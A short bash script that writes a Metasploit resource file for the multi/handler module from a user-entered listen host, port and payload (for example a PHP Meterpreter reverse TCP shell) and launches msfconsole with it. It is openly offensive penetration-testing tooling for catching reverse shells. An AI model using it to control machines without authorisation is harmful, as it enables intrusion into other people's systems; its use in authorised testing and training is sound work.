#!/bin/bash

# creates a msf ressource file and runs metasploit multi handler

# read VARIABLES
echo ""
echo "enter listen host:"
read LHOST
echo "enter listen port:"
read LPORT
echo "enter payload: (e.g. php/meterpreter/reverse_tcp)"
read PAYLOAD

# create msf .rc file
echo "use exploit/multi/handler" > multi_handler.rc
echo "set LHOST $LHOST" >> multi_handler.rc
echo "set LPORT $LPORT" >> multi_handler.rc
echo "set payload $PAYLOAD" >> multi_handler.rc
echo "exploit" >> multi_handler.rc

# start msfconsole and use created ressource file
echo "multi_handler.rc created.... now running msf"
service postgresql start
msfconsole -r multi_handler.rc
